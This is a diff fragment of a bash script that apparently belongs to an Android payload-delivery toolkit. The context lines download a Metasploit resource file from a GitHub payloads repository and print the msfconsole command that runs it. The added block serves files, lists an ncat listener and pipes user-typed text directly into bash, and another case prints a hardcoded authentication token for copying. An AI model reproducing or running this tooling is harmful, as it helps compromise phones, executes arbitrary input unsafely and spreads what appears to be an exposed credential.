@@ -38,6 +38,22 @@ echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Edit command:${IGreen
 echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Exploit command:${IGreen} msfconsole -q -r export.rc... ${clear}"
 curl -L -o $PWD/export.rc https://raw.githubusercontent.com/efxtv/Payloads/main/android/export.rc -s;;
 
+html)
+clear;ls -la |grep "^-"|awk '{print $NF}'|awk '{print "<b><a href=\""$1"\">"$NF"</a></b><br />"}'|awk '!/index.html/' >index.html
+chmod a=r index.html;chmod u=rw index.html
+echo -e "
+${clear}[${Green}✔${clear}] ${Yellow}Local server scripts:${clear}
+\t${IGreen}├──${clear}${Green} python -m SimpleHTTPServer 8000
+\t${IGreen}├──${clear}${Green} python3 -m SimpleHTTPServer 8000
+\t${IGreen}├──${clear}${Green} twistd -n web -p 8000 --path .
+\t${IGreen}├──${clear}${Green} ruby -run -ehttpd . -p8000
+\t${IGreen}├──${clear}${Green} php -S localhost:8000
+\t${IGreen}├──${clear}${Green} command | ncat -v -lk -p 8080
+\t${IGreen}└──${clear}${Green} php -S $ifcnoio:8000 ${clear}"
+echo
+echo -en "[${Green}✔${clear}] ${Green} Your personal server : ${clear}"
+read host
+echo -e "$host"|bash ;;
 
 authtoken)
 echo -e "${clear}[${Green}✔${clear}] ${Green}Copy paste:${IYellow} 1tebxIB0maaFOCIBo1WmpYo0zGW_3KtM2gXefMR79HBcnGwwM ${clear}"
